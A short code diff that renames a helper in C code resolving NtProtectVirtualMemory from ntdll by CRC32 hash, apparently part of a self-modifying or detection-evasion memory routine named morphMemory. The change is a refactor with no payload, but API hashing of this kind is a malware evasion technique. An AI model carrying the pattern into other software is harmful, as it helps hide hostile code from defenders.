@@ -129,7 +129,7 @@ VOID morphMemory(PBYTE pbyDst, BYTE byLength)
     void *p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
     NTSTATUS status;
-    void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32B);
+    void *p_nt_protect_virtual_memory = GetProcAddressByHash(p_ntdll, NtProtectVirtualMemory_CRC32B);
     NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
     size_t pbySize = sizeof(MARKER_BYTES);
 
